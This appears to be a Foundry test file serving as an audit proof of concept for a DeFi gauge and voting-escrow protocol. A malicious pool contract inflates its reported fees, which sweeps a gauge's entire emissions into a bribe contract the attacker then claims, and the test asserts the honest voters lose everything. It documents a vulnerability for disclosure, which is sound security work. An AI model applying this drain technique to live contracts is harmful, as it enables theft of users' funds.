// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {C4PoCTestbed} from "./C4PoCTestbed.t.sol";

contract MintableERC20Standalone is ERC20 {
    uint8 private immutable _decimals;

    constructor(string memory name_, string memory symbol_, uint8 decimals_)
        ERC20(name_, symbol_)
    {
        _decimals = decimals_;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

interface IGaugeRewardToken {
    function rewardToken() external view returns (address);
}

contract MaliciousCLPoolHarness {
    address public immutable gaugeManager;
    address public immutable token0Addr;
    address public immutable token1Addr;

    address public gauge;
    address public nft;

    uint256 private _rewardReserve;

    constructor(address _token0, address _token1, address _gaugeManager) {
        token0Addr = _token0;
        token1Addr = _token1;
        gaugeManager = _gaugeManager;
    }

    function token0() external view returns (address) {
        return token0Addr;
    }

    function token1() external view returns (address) {
        return token1Addr;
    }

    function setGaugeAndPositionManager(address _gauge, address _nft) external {
        require(msg.sender == gaugeManager, "GM_ONLY");
        gauge = _gauge;
        nft = _nft;
    }

    function updateRewardsGrowthGlobal() external {}

    function rewardGrowthGlobalX128() external pure returns (uint256) {
        return 0;
    }

    function rewardReserve() external view returns (uint256) {
        return _rewardReserve;
    }

    function stakedLiquidity() external pure returns (uint128) {
        return 1;
    }

    function lastUpdated() external view returns (uint32) {
        return uint32(block.timestamp);
    }

    function syncReward(uint256, uint256 rewardReserve_, uint256) external {
        _rewardReserve = rewardReserve_;
    }

    function rollover() external pure returns (uint256) {
        return 0;
    }

    function getRewardGrowthInside(int24, int24, uint256) external pure returns (uint256) {
        return 0;
    }

    function stake(int128, int24, int24, bool) external {}

    function collectFees() external returns (uint128 claimed0, uint128 claimed1) {
        address gaugeAddr = msg.sender;
        address reward = IGaugeRewardToken(gaugeAddr).rewardToken();
        uint256 balance = ERC20(reward).balanceOf(gaugeAddr);
        if (balance > 0) {
            require(balance <= type(uint128).max, "overflow");
            claimed0 = uint128(balance);
        }
        claimed1 = 0;
    }

    function gaugeFees() external pure returns (uint256, uint256) {
        return (0, 0);
    }
}

contract C4PoC is C4PoCTestbed {
    uint256 internal constant WEEK = 1800;
    uint256 internal constant NO_VOTING_WINDOW = 300;

    address internal teamMultisig;
    MintableERC20Standalone internal mockToken;

    function setUp() public override {
        super.setUp();

        teamMultisig = makeAddr("team");

        permissionsRegistry.setRoleFor(teamMultisig, "GOVERNANCE");
        permissionsRegistry.setRoleFor(teamMultisig, "GENESIS_MANAGER");
        permissionsRegistry.setRoleFor(teamMultisig, "GAUGE_ADMIN");
        permissionsRegistry.setHybraTeamMultisig(teamMultisig);
        permissionsRegistry.setHybraMultisig(teamMultisig);

        minter.setTeam(teamMultisig);
        vm.prank(teamMultisig);
        minter.acceptTeam();

        mockToken = new MintableERC20Standalone("Mock Token", "MOCK", 18);

        vm.startPrank(teamMultisig);
        if (!tokenHandler.isWhitelisted(address(hybr))) {
            tokenHandler.whitelistToken(address(hybr));
        }
        if (!tokenHandler.isWhitelisted(address(mockToken))) {
            tokenHandler.whitelistToken(address(mockToken));
        }
        if (!tokenHandler.isConnector(address(mockToken))) {
            tokenHandler.whitelistConnector(address(mockToken));
        }
        vm.stopPrank();

        mockToken.mint(teamMultisig, 1e27);
        hybr.transfer(teamMultisig, 5e24);
    }

    function test_submissionValidity() external {
        address attacker = makeAddr("attacker");
        vm.label(attacker, "attacker");

        // Attacker deploys malicious pool and registers a CL gauge permissionlessly.
        vm.startPrank(attacker);
        MaliciousCLPoolHarness maliciousPool = new MaliciousCLPoolHarness(
            address(hybr),
            address(mockToken),
            address(gaugeManager)
        );
        (address gaugeAddr, address internalBribe,) = gaugeManager.createGauge(address(maliciousPool), 1);
        vm.stopPrank();

        // Treasury funds the gauge with a typical epoch emission.
        uint256 emission = 5e22; // 50,000 HYBR
        vm.prank(teamMultisig);
        hybr.transfer(gaugeAddr, emission);
        uint256 bribeBalanceBefore = hybr.balanceOf(internalBribe);

        // Honest voters (victims) lock HYBR and vote the pool, expecting equal rewards.
        address[] memory victims = new address[](3);
        victims[0] = makeAddr("victim1");
        victims[1] = makeAddr("victim2");
        victims[2] = makeAddr("victim3");

        uint256[] memory victimLocks = new uint256[](3);
        victimLocks[0] = 2e22;
        victimLocks[1] = 15e21;
        victimLocks[2] = 15e21;

        uint256[] memory victimTokenIds = new uint256[](3);
        for (uint256 i = 0; i < victims.length; i++) {
            vm.prank(teamMultisig);
            hybr.transfer(victims[i], victimLocks[i]);

            vm.startPrank(victims[i]);
            hybr.approve(address(votingEscrow), victimLocks[i]);
            victimTokenIds[i] = votingEscrow.create_lock(victimLocks[i], 4 * WEEK);
            vm.stopPrank();
        }

        uint256 equalShare = emission / victims.length;
        uint256[] memory victimExpected = new uint256[](3);
        victimExpected[0] = equalShare;
        victimExpected[1] = equalShare;
        victimExpected[2] = emission - (equalShare * 2);

        // Attacker gains voting power and directs emissions to the malicious pool.
        uint256 attackerStake = 1e23;
        vm.prank(teamMultisig);
        hybr.transfer(attacker, attackerStake);

        vm.startPrank(attacker);
        hybr.approve(address(votingEscrow), attackerStake);
        uint256 attackerTokenId = votingEscrow.create_lock(attackerStake, 4 * WEEK);
        vm.stopPrank();

        _warpToNextEpoch();
        _warpIntoVotingWindow();

        address[] memory pools = new address[](1);
        pools[0] = address(maliciousPool);
        uint256[] memory weights = new uint256[](1);
        weights[0] = 1;
        vm.prank(attacker);
        voter.vote(attackerTokenId, pools, weights);

        // Trigger fee distribution: the malicious pool siphons all gauge emissions into the bribe.
        vm.prank(attacker);
        gaugeManager.distributeFees();

        assertEq(ERC20(address(hybr)).balanceOf(gaugeAddr), 0, "Gauge should be drained after distributeFees");
        assertEq(
            hybr.balanceOf(internalBribe) - bribeBalanceBefore,
            emission,
            "Emissions not diverted to bribe"
        );

        // After the next epoch, the attacker claims the stolen emissions via the bribe contract.
        _warpToNextEpoch();

        address[] memory bribes = new address[](1);
        bribes[0] = internalBribe;
        address[][] memory rewardTokens = new address[][](1);
        rewardTokens[0] = new address[](1);
        rewardTokens[0][0] = address(hybr);

        uint256 attackerBalanceBefore = hybr.balanceOf(attacker);
        vm.prank(attacker);
        gaugeManager.claimBribes(bribes, rewardTokens, attackerTokenId);
        uint256 attackerBalanceAfter = hybr.balanceOf(attacker);

        assertEq(attackerBalanceAfter - attackerBalanceBefore, emission, "Attacker failed to withdraw emissions");
        assertEq(hybr.balanceOf(internalBribe), bribeBalanceBefore, "Bribe balance should be emptied");

        // Victims attempt to claim but receive nothing, taking the full loss.
        uint256 totalVictimLoss = 0;
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 balanceBefore = hybr.balanceOf(victims[i]);
            vm.prank(victims[i]);
            gaugeManager.claimBribes(bribes, rewardTokens, victimTokenIds[i]);
            uint256 actual = hybr.balanceOf(victims[i]) - balanceBefore;
            uint256 loss = victimExpected[i] > actual ? victimExpected[i] - actual : 0;
            totalVictimLoss += loss;

            string memory idx = vm.toString(i + 1);
            emit log_named_decimal_uint(string.concat("Victim ", idx, " expected HYBR"), victimExpected[i], 18);
            emit log_named_decimal_uint(string.concat("Victim ", idx, " actual HYBR"), actual, 18);

            assertEq(actual, 0, "Victim unexpectedly received rewards");
        }

        assertEq(totalVictimLoss, emission, "Victim aggregate loss mismatch");
    }

    function _warpIntoVotingWindow() internal {
        uint256 current = block.timestamp;
        uint256 epochStart = current - (current % WEEK);
        uint256 voteStart = epochStart + NO_VOTING_WINDOW;
        if (current <= voteStart) {
            vm.warp(voteStart + 1);
        }
    }

    function _warpToNextEpoch() internal {
        uint256 current = block.timestamp;
        uint256 epochStart = current - (current % WEEK);
        uint256 nextEpochStart = epochStart + WEEK;
        vm.warp(nextEpochStart + 1);
    }
}